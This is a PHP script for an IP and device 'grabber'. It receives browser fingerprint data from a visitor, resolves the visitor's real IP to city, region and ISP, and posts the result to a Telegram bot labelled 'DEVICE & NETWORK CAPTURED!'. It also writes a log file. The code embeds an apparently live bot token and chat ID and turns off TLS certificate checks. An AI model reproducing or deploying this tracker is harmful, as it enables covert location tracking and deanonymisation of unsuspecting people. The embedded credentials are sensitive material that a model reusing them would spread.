<?php
// ******************************************
// CONFIGURATION: PASTE YOUR DETAILS BACK HERE
// ******************************************
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId = "-5254683910";
// ******************************************

// Receive Data
$os = $_POST['Os'];
$ptf = $_POST['Ptf'];
$brw = $_POST['Brw'];
$cc = $_POST['Cc'];
$ram = $_POST['Ram'];
$ven = $_POST['Ven'];
$ren = $_POST['Ren'];
$ht = $_POST['Ht'];
$wd = $_POST['Wd'];

// Get Real IP (Cloudflare support included)
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// --- NEW: IP INTELLIGENCE LOOKUP (The Upgrade) ---
// This asks a public database for the city/isp of the IP
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$city = $details->city ?? "Unknown";
$region = $details->regionName ?? "Unknown";
$country = $details->country ?? "Unknown";
$isp = $details->isp ?? "Unknown";
// -------------------------------------------------

// Format Message (Professional Dashboard Style)
$message = "<b>📱 DEVICE & NETWORK CAPTURED!</b>\n\n";

// Section 1: Network / Location (The new stuff)
$message .= "<b>🌐 NETWORK INTELLIGENCE:</b>\n";
$message .= "├ <b>IP:</b> <code>" . $ip . "</code>\n";
$message .= "├ <b>City:</b> " . $city . "\n";
$message .= "├ <b>Region:</b> " . $region . ", " . $country . "\n";
$message .= "└ <b>ISP:</b> " . $isp . "\n\n";

// Section 2: Device Details
$message .= "<b>💻 DEVICE FINGERPRINT:</b>\n";
$message .= "├ <b>OS:</b> " . $os . " (" . $ptf . ")\n";
$message .= "├ <b>Browser:</b> " . $brw . "\n";
$message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
$message .= "├ <b>RAM:</b> " . $ram . " GB\n";
$message .= "├ <b>Cores:</b> " . $cc . "\n";
$message .= "└ <b>GPU:</b> " . $ven . " (" . $ren . ")\n";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save Log
$f = fopen('../../logs/info.txt', 'w+');
fwrite($f, $message);
fclose($f);
?>
